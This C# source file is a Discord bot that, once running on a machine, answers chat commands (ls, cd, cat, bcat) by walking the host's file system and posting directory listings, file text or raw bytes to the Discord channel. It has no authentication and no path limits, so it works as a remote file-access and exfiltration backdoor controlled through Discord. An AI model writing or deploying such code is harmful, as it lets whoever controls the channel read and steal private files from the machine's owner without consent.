using System;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using DSharpPlus;
using DSharpPlus.Entities;
using System.Runtime.CompilerServices;

namespace BGAppTesting
{
    class Program
    {
        static DiscordClient discord;
        static string curDir;

        static void Main(string[] args)
        {
            curDir = Directory.GetCurrentDirectory();
            MainAsync(args).ConfigureAwait(false).GetAwaiter().GetResult();
            File.WriteAllLines("t.txt", Directory.GetFiles(Directory.GetCurrentDirectory()));
        }

        //start bot and stuff
        static async Task MainAsync(string[] args)
        {
            //token 
            //
            string data = "";
            //create bot
            discord = new DiscordClient(new DiscordConfiguration
            {
                Token = "<Token>",
                TokenType = TokenType.Bot

            });
            //if message created
            discord.MessageCreated += async (s, e) =>
            {
                //ls command
                if(e.Message.Content.StartsWith("ls"))
                {
                    data = "**Directories**\n";
                    string[] arr = Directory.GetDirectories(curDir);
                    for (int i = 0; i < arr.Length; i++)
                    {
                        data += arr[i].Replace(curDir, "") + "\n";
                    }
                    data += "**Files**\n";
                    arr = Directory.GetFiles(curDir);
                    for (int i = 0; i < arr.Length; i++)
                    {
                        data += arr[i].Replace(curDir, "") + "\n";
                    }
                    discord.SendMessageAsync(e.Message.Channel, data);
                    data = "";
                }
                //cd command
                if(e.Message.Content.StartsWith("cd"))
                {
                    string address = e.Message.Content.Replace("cd ", "");
                    if(address == "..")
                    {
                        RemoveLastDir();
                    }
                    else
                    {
                        curDir += '\\' + address;
                    }
                    discord.SendMessageAsync(e.Message.Channel, "**Current Directory Set to: **" + curDir);
                }
                //curDir command
                if(e.Message.Content.StartsWith("curDir"))
                {
                    discord.SendMessageAsync(e.Message.Channel, "**Current Directory is: **" + curDir);
                }
                //cat command
                if(e.Message.Content.StartsWith("cat"))
                {
                    data = File.ReadAllText(curDir + '\\' + e.Message.Content.Replace("cat ", ""));
                    discord.SendMessageAsync(e.Message.Channel, data);
                    data = "";
                }
                //bcat command       cat but for bytes
                if (e.Message.Content.StartsWith("bcat"))
                {
                    byte[] bytes = File.ReadAllBytes(curDir + '\\' + e.Message.Content.Replace("bcat ", ""));
                    for (int i = 0; i < 500; i++)
                    {
                        if(i >= bytes.Length)
                        {
                            break;
                        }
                        data += bytes[i].ToString();
                    }
                    discord.SendMessageAsync(e.Message.Channel, "**Length of file in bytes: **" + bytes.Length.ToString() + '\n' + "**First 500 bytes of data: **" + data);
                    data = "";
                }
            };

            //start bot
            await discord.ConnectAsync();
            await Task.Delay(-1);
        }
        //filter out last directory
        static void RemoveLastDir()
        {
            char[] chars = curDir.ToCharArray();
            for (int i = chars.Length - 1; i >= 0; i--)
            {
                if(chars[i] == '\\')
                {
                    curDir = curDir.Substring(0, i);
                    return;
                }
            }
        }
    }
}
